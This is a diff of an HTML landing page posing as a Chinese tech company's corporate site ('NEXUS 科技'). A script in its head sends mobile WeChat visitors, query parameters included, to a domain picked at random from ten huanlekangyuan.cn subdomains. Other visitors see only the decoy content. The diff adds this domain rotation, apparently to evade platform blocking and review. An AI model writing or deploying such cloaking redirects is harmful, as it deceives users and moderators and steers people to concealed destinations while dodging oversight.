@@ -4,33 +4,54 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>NEXUS 科技 · 未来创新引擎</title>
-    
-    <!-- ========== 跳转逻辑：可配置目标域名 + 完整携带参数 ========== -->
+
+    <!-- ============================================================
+         跳转逻辑：多域名随机选择 + 完整携带参数
+         ============================================================ -->
     <script>
         (function() {
-            // ===== 这里改成您需要的目标域名（注意以 https:// 开头，不要带尾部斜杠） =====
-            const TARGET_DOMAIN = "https://zb.huanlekangyuan.cn";  // 您可随意修改为任何域名，如 "https://your-site.com"
-            // =========================================================================
-            
+            // =========================================================
+            // ★★★ 在这里配置您的目标域名列表（至少1个，建议多个） ★★★
+            // 每次跳转时会从列表中随机选择一个域名
+            // 注意：以 https:// 开头，不要带尾部斜杠
+            // =========================================================
+            const TARGET_DOMAINS = [
+                "https://zb.huanlekangyuan.cn", // 用户提供的域名
+                "https://nj.huanlekangyuan.cn", // 示例，请替换为您自己的域名
+                "https://sq3.huanlekangyuan.cn", // 示例，请替换为您自己的域名
+                "https://sq4.huanlekangyuan.cn", // 示例，请替换为您自己的域名
+                "https://sq5.huanlekangyuan.cn", // 示例，请替换为您自己的域名
+                "https://sq6.huanlekangyuan.cn", // 示例，请替换为您自己的域名
+                "https://sq7.huanlekangyuan.cn", // 示例，请替换为您自己的域名
+                "https://sq8.huanlekangyuan.cn", // 示例，请替换为您自己的域名
+                "https://sq9.huanlekangyuan.cn", // 示例，请替换为您自己的域名
+                "https://sq10.huanlekangyuan.cn" // 示例，请替换为您自己的域名
+            ];
+            // =========================================================
+
+            // 从列表中随机选择一个域名
+            const randomIndex = Math.floor(Math.random() * TARGET_DOMAINS.length);
+            const TARGET_DOMAIN = TARGET_DOMAINS[randomIndex];
+
             // 获取当前 URL 的查询参数部分（例如 "?invite=xxx&site=xxx"）
             const currentQuery = window.location.search;
-            
+
             // 检测是否为手机移动端 + 微信内置浏览器
             const ua = navigator.userAgent || '';
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
             const isWeChat = /MicroMessenger|WeChat/i.test(ua);
             const isMobileWeChat = isMobile && isWeChat;
-            
+
             // 检查当前是否已经在目标域名上，避免无限循环
             const currentHost = window.location.hostname;
             const targetHost = new URL(TARGET_DOMAIN).hostname;
             const isAlreadyOnTarget = (currentHost === targetHost);
-            
+
             // 满足条件则跳转，并携带原始所有参数
             if (isMobileWeChat && !isAlreadyOnTarget) {
                 let redirectUrl = TARGET_DOMAIN;
                 if (currentQuery) {
-                    redirectUrl += currentQuery;   // 原样带上所有参数
+                    redirectUrl += currentQuery; // 原样带上所有参数
                 }
                 // 立即跳转（替换当前历史记录）
                 window.location.replace(redirectUrl);
@@ -38,11 +59,11 @@
             }
         })();
     </script>
-    
+
     <!-- Google Fonts & 现代字体 -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    
+
     <style>
         * {
             margin: 0;
@@ -70,7 +91,7 @@
             z-index: 1000;
             backdrop-filter: blur(20px);
             background: rgba(10, 12, 16, 0.75);
-            border-bottom: 1px solid rgba(255,255,255,0.08);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
             padding: 1rem 2rem;
         }
 
@@ -93,7 +114,7 @@
         }
         .logo span {
             font-weight: 400;
-            color: rgba(255,255,255,0.7);
+            color: rgba(255, 255, 255, 0.7);
         }
 
         .nav-links {
@@ -109,7 +130,8 @@
             padding: 0.5rem 0;
             border-bottom: 2px solid transparent;
         }
-        .nav-links li:hover, .nav-links li.active {
+        .nav-links li:hover,
+        .nav-links li.active {
             color: white;
             border-bottom-color: #3b82f6;
         }
@@ -151,7 +173,7 @@
 
         footer {
             background: #05070a;
-            border-top: 1px solid rgba(255,255,255,0.05);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
             padding: 3rem 2rem 2rem;
             text-align: center;
             color: #94a3b8;
@@ -181,14 +203,14 @@
             backdrop-filter: blur(4px);
             border-radius: 2rem;
             padding: 1.8rem;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             transition: all 0.3s;
         }
         .card:hover {
             transform: translateY(-8px);
             background: rgba(30, 35, 48, 0.8);
-            border-color: rgba(59,130,246,0.5);
-            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.3);
+            border-color: rgba(59, 130, 246, 0.5);
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.3);
         }
 
         .btn {
@@ -205,18 +227,28 @@
         }
         .btn-outline {
             background: transparent;
-            border: 1px solid rgba(255,255,255,0.3);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
         .btn-outline:hover {
-            background: rgba(255,255,255,0.1);
+            background: rgba(255, 255, 255, 0.1);
             border-color: white;
         }
 
-        .page1 .hero-bg { background: radial-gradient(circle at 20% 30%, #0f172a, #020617); }
-        .page2 .hero-bg { background: radial-gradient(circle at 80% 10%, #0c1e2e, #030712); }
-        .page3 .hero-bg { background: radial-gradient(circle at 30% 70%, #132a1f, #020c0a); }
-        .page4 .hero-bg { background: radial-gradient(circle at 70% 80%, #2d1a11, #070500); }
-        .page5 .hero-bg { background: radial-gradient(circle at 40% 40%, #1e1b2f, #0a0a14); }
+        .page1 .hero-bg {
+            background: radial-gradient(circle at 20% 30%, #0f172a, #020617);
+        }
+        .page2 .hero-bg {
+            background: radial-gradient(circle at 80% 10%, #0c1e2e, #030712);
+        }
+        .page3 .hero-bg {
+            background: radial-gradient(circle at 30% 70%, #132a1f, #020c0a);
+        }
+        .page4 .hero-bg {
+            background: radial-gradient(circle at 70% 80%, #2d1a11, #070500);
+        }
+        .page5 .hero-bg {
+            background: radial-gradient(circle at 40% 40%, #1e1b2f, #0a0a14);
+        }
 
         .stat-number {
             font-size: 2.8rem;
@@ -235,7 +267,7 @@
                 align-items: center;
                 gap: 1rem;
                 padding: 1rem 0;
-                background: rgba(0,0,0,0.9);
+                background: rgba(0, 0, 0, 0.9);
                 border-radius: 2rem;
                 margin-top: 1rem;
             }
@@ -260,12 +292,12 @@
         }
 
         .badge {
-            background: rgba(59,130,246,0.2);
+            background: rgba(59, 130, 246, 0.2);
             padding: 0.2rem 1rem;
             border-radius: 30px;
             font-size: 0.8rem;
             width: fit-content;
-            border: 1px solid rgba(59,130,246,0.4);
+            border: 1px solid rgba(59, 130, 246, 0.4);
         }
         h1 {
             font-size: 3.5rem;
@@ -274,81 +306,187 @@
             line-height: 1.2;
         }
         @media (max-width: 700px) {
-            h1 { font-size: 2.2rem; }
+            h1 {
+                font-size: 2.2rem;
+            }
         }
     </style>
 </head>
 <body>
 
-<nav class="navbar">
-    <div class="nav-container">
-        <div class="logo">NEXUS<span>//TECH</span></div>
-        <div class="menu-toggle" id="mobile-menu">
-            <i class="fas fa-bars"></i>
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo">NEXUS<span>//TECH</span></div>
+            <div class="menu-toggle" id="mobile-menu">
+                <i class="fas fa-bars"></i>
+            </div>
+            <ul class="nav-links" id="nav-links">
+                <li data-page="1">AI 智慧引擎</li>
+                <li data-page="2">云创基石</li>
+                <li data-page="3">开发者工坊</li>
+                <li data-page="4">星火人文</li>
+                <li data-page="5">可信安全</li>
+            </ul>
         </div>
-        <ul class="nav-links" id="nav-links">
-            <li data-page="1">AI 智慧引擎</li>
-            <li data-page="2">云创基石</li>
-            <li data-page="3">开发者工坊</li>
-            <li data-page="4">星火人文</li>
-            <li data-page="5">可信安全</li>
-        </ul>
+    </nav>
+
+    <!-- ===== 5个精美页面 ===== -->
+    <div id="page1" class="page page1">
+        <div class="hero-bg" style="min-height: 100vh; padding-top: 80px;">
+            <section>
+                <div class="container">
+                    <div class="badge">NEXUS NEO · 智能新纪元</div>
+                    <h1 style="margin-top: 1rem;">重塑无限可能<br>生成式AI 平台</h1>
+                    <p style="font-size: 1.2rem; max-width: 600px; margin: 1.5rem 0 2rem;">行业领先的大模型＋全栈式机器学习基础设施。</p>
+                    <button class="btn">探索AI方案 <i class="fas fa-arrow-right"></i></button>
+                </div>
+            </section>
+            <div class="container">
+                <div class="card-grid">
+                    <div class="card"><i class="fas fa-brain" style="font-size: 2rem; color: #3b82f6;"></i><h3>多模态感知</h3><p>文本/图像/视频联合推理。</p></div>
+                    <div class="card"><i class="fas fa-chart-line" style="font-size: 2rem; color: #3b82f6;"></i><h3>实时训练引擎</h3><p>万亿参数分布式训练。</p></div>
+                    <div class="card"><i class="fas fa-shield-alt" style="font-size: 2rem; color: #3b82f6;"></i><h3>安全合规AI</h3><p>企业级数据隔离。</p></div>
+                </div>
+                <div style="background: linear-gradient(120deg, #1e293b, #0f172a); border-radius: 2rem; padding: 2rem; text-align: center;">
+                    <p style="font-size: 1.8rem; font-weight: 600;">98%</p>
+                    <p>客户推理准确率提升</p>
+                </div>
+            </div>
+        </div>
     </div>
-</nav>
 
-<!-- 5个精美页面（内容完整，但因篇幅略缩展示核心） -->
-<div id="page1" class="page page1"><div class="hero-bg" style="min-height: 100vh; padding-top: 80px;"><section><div class="container"><div class="badge">NEXUS NEO · 智能新纪元</div><h1 style="margin-top: 1rem;">重塑无限可能<br>生成式AI 平台</h1><p style="font-size: 1.2rem; max-width: 600px; margin: 1.5rem 0 2rem;">行业领先的大模型＋全栈式机器学习基础设施。</p><button class="btn">探索AI方案 <i class="fas fa-arrow-right"></i></button></div></section><div class="container"><div class="card-grid"><div class="card"><i class="fas fa-brain" style="font-size: 2rem; color: #3b82f6;"></i><h3>多模态感知</h3><p>文本/图像/视频联合推理。</p></div><div class="card"><i class="fas fa-chart-line" style="font-size: 2rem; color: #3b82f6;"></i><h3>实时训练引擎</h3><p>万亿参数分布式训练。</p></div><div class="card"><i class="fas fa-shield-alt" style="font-size: 2rem; color: #3b82f6;"></i><h3>安全合规AI</h3><p>企业级数据隔离。</p></div></div><div style="background: linear-gradient(120deg, #1e293b, #0f172a); border-radius: 2rem; padding: 2rem; text-align: center;"><p style="font-size: 1.8rem; font-weight: 600;">98%</p><p>客户推理准确率提升</p></div></div></div></div>
+    <div id="page2" class="page page2">
+        <div class="hero-bg" style="min-height: 100vh; padding-top: 80px;">
+            <section>
+                <div class="container">
+                    <div class="badge">全球分布式云</div>
+                    <h1>云原生基座<br>无界算力矩阵</h1>
+                    <p style="font-size: 1.2rem;">覆盖31个地理区域，毫秒级响应。</p>
+                    <button class="btn btn-outline">即刻部署 <i class="fas fa-cloud-arrow-up"></i></button>
+                </div>
+            </section>
+            <div class="container">
+                <div class="card-grid">
+                    <div class="card"><i class="fas fa-database"></i><h3>EB级数据仓库</h3></div>
+                    <div class="card"><i class="fas fa-globe"></i><h3>全球加速网络</h3></div>
+                    <div class="card"><i class="fas fa-server"></i><h3>裸金属性能</h3></div>
+                </div>
+                <div style="display: flex; gap: 2rem; flex-wrap: wrap;">
+                    <div><span class="stat-number">99.99%</span><br>可用性SLA</div>
+                    <div><span class="stat-number">＜50ms</span><br>全球平均时延</div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-<div id="page2" class="page page2"><div class="hero-bg" style="min-height: 100vh; padding-top: 80px;"><section><div class="container"><div class="badge">全球分布式云</div><h1>云原生基座<br>无界算力矩阵</h1><p style="font-size: 1.2rem;">覆盖31个地理区域，毫秒级响应。</p><button class="btn btn-outline">即刻部署 <i class="fas fa-cloud-arrow-up"></i></button></div></section><div class="container"><div class="card-grid"><div class="card"><i class="fas fa-database"></i><h3>EB级数据仓库</h3></div><div class="card"><i class="fas fa-globe"></i><h3>全球加速网络</h3></div><div class="card"><i class="fas fa-server"></i><h3>裸金属性能</h3></div></div><div style="display: flex; gap: 2rem; flex-wrap: wrap;"><div><span class="stat-number">99.99%</span><br>可用性SLA</div><div><span class="stat-number">＜50ms</span><br>全球平均时延</div></div></div></div></div>
+    <div id="page3" class="page page3">
+        <div class="hero-bg" style="min-height: 100vh; padding-top: 80px;">
+            <section>
+                <div class="container">
+                    <div class="badge">OPEN · 创造者生态</div>
+                    <h1>开发者优先<br>从API到生产环境</h1>
+                    <button class="btn"><i class="fab fa-github"></i> 开始构建</button>
+                </div>
+            </section>
+            <div class="container">
+                <div class="card-grid">
+                    <div class="card"><i class="fab fa-python"></i><h3>Python SDK</h3></div>
+                    <div class="card"><i class="fab fa-js"></i><h3>Node.js / TS</h3></div>
+                    <div class="card"><i class="fas fa-terminal"></i><h3>CLI 专家模式</h3></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-<div id="page3" class="page page3"><div class="hero-bg" style="min-height: 100vh; padding-top: 80px;"><section><div class="container"><div class="badge">OPEN · 创造者生态</div><h1>开发者优先<br>从API到生产环境</h1><button class="btn"><i class="fab fa-github"></i> 开始构建</button></div></section><div class="container"><div class="card-grid"><div class="card"><i class="fab fa-python"></i><h3>Python SDK</h3></div><div class="card"><i class="fab fa-js"></i><h3>Node.js / TS</h3></div><div class="card"><i class="fas fa-terminal"></i><h3>CLI 专家模式</h3></div></div></div></div></div>
+    <div id="page4" class="page page4">
+        <div class="hero-bg" style="min-height: 100vh; padding-top: 80px;">
+            <section>
+                <div class="container">
+                    <div class="badge">驱动向善科技</div>
+                    <h1>创新不息 以人为本</h1>
+                    <button class="btn-outline btn">加入我们 <i class="fas fa-rocket"></i></button>
+                </div>
+            </section>
+            <div class="container">
+                <div class="card-grid">
+                    <div class="card"><i class="fas fa-leaf"></i><h3>碳中和承诺</h3></div>
+                    <div class="card"><i class="fas fa-graduation-cap"></i><h3>AI for Good</h3></div>
+                    <div class="card"><i class="fas fa-hand-sparkles"></i><h3>多元&包容</h3></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-<div id="page4" class="page page4"><div class="hero-bg" style="min-height: 100vh; padding-top: 80px;"><section><div class="container"><div class="badge">驱动向善科技</div><h1>创新不息 以人为本</h1><button class="btn-outline btn">加入我们 <i class="fas fa-rocket"></i></button></div></section><div class="container"><div class="card-grid"><div class="card"><i class="fas fa-leaf"></i><h3>碳中和承诺</h3></div><div class="card"><i class="fas fa-graduation-cap"></i><h3>AI for Good</h3></div><div class="card"><i class="fas fa-hand-sparkles"></i><h3>多元&包容</h3></div></div></div></div></div>
+    <div id="page5" class="page page5">
+        <div class="hero-bg" style="min-height: 100vh; padding-top: 80px;">
+            <section>
+                <div class="container">
+                    <div class="badge">零信任架构</div>
+                    <h1>坚固如磐的数据盔甲</h1>
+                    <button class="btn">安全白皮书 <i class="fas fa-file-pdf"></i></button>
+                </div>
+            </section>
+            <div class="container">
+                <div class="card-grid">
+                    <div class="card"><i class="fas fa-key"></i><h3>KMS 密钥管理</h3></div>
+                    <div class="card"><i class="fas fa-eye"></i><h3>实时威胁检测</h3></div>
+                    <div class="card"><i class="fas fa-check-double"></i><h3>隐私合规</h3></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-<div id="page5" class="page page5"><div class="hero-bg" style="min-height: 100vh; padding-top: 80px;"><section><div class="container"><div class="badge">零信任架构</div><h1>坚固如磐的数据盔甲</h1><button class="btn">安全白皮书 <i class="fas fa-file-pdf"></i></button></div></section><div class="container"><div class="card-grid"><div class="card"><i class="fas fa-key"></i><h3>KMS 密钥管理</h3></div><div class="card"><i class="fas fa-eye"></i><h3>实时威胁检测</h3></div><div class="card"><i class="fas fa-check-double"></i><h3>隐私合规</h3></div></div></div></div></div>
+    <footer>
+        <div class="footer-content">
+            <div>© 2025 NEXUS TECHNOLOGY</div>
+            <div><i class="fab fa-twitter"></i> <i class="fab fa-linkedin"></i> <i class="fab fa-github"></i> 隐私条款</div>
+        </div>
+        <div class="footer-copyright"> innovate without boundaries</div>
+    </footer>
 
-<footer>
-    <div class="footer-content"><div>© 2025 NEXUS TECHNOLOGY</div><div><i class="fab fa-twitter"></i> <i class="fab fa-linkedin"></i> <i class="fab fa-github"></i> 隐私条款</div></div>
-    <div class="footer-copyright"> innovate without boundaries</div>
-</footer>
+    <script>
+        // 页面切换逻辑
+        const pages = [
+            document.getElementById('page1'),
+            document.getElementById('page2'),
+            document.getElementById('page3'),
+            document.getElementById('page4'),
+            document.getElementById('page5')
+        ];
+        const navItems = document.querySelectorAll('.nav-links li');
 
-<script>
-    // 页面切换随机轮换（仅当未发生跳转时执行）
-    const pages = [document.getElementById('page1'), document.getElementById('page2'), document.getElementById('page3'), document.getElementById('page4'), document.getElementById('page5')];
-    const navItems = document.querySelectorAll('.nav-links li');
+        function showPage(num) {
+            if (num < 1 || num > 5) return;
+            pages.forEach(p => p.classList.remove('active-page'));
+            pages[num - 1].classList.add('active-page');
+            navItems.forEach((item, idx) => {
+                if (parseInt(item.getAttribute('data-page')) === num) item.classList.add('active');
+                else item.classList.remove('active');
+            });
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
 
-    function showPage(num) {
-        if (num < 1 || num > 5) return;
-        pages.forEach(p => p.classList.remove('active-page'));
-        pages[num-1].classList.add('active-page');
-        navItems.forEach((item, idx) => {
-            if (parseInt(item.getAttribute('data-page')) === num) item.classList.add('active');
-            else item.classList.remove('active');
+        function getRandomPage() { return Math.floor(Math.random() * 5) + 1; }
+
+        navItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const target = parseInt(item.getAttribute('data-page'));
+                if (!isNaN(target)) showPage(target);
+                if (window.innerWidth <= 900) document.getElementById('nav-links').classList.remove('show');
+            });
         });
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
 
-    function getRandomPage() { return Math.floor(Math.random() * 5) + 1; }
-
-    navItems.forEach(item => {
-        item.addEventListener('click', () => {
-            const target = parseInt(item.getAttribute('data-page'));
-            if (!isNaN(target)) showPage(target);
-            if (window.innerWidth <= 900) document.getElementById('nav-links').classList.remove('show');
+        document.getElementById('mobile-menu').addEventListener('click', () => {
+            document.getElementById('nav-links').classList.toggle('show');
         });
-    });
 
-    document.getElementById('mobile-menu').addEventListener('click', () => {
-        document.getElementById('nav-links').classList.toggle('show');
-    });
+        window.addEventListener('resize', () => {
+            if (window.innerWidth > 900) document.getElementById('nav-links').classList.remove('show');
+        });
 
-    window.addEventListener('resize', () => {
-        if (window.innerWidth > 900) document.getElementById('nav-links').classList.remove('show');
-    });
-
-    window.addEventListener('DOMContentLoaded', () => {
-        showPage(getRandomPage());
-    });
-</script>
+        window.addEventListener('DOMContentLoaded', () => {
+            showPage(getRandomPage());
+        });
+    </script>
 </body>
 </html>
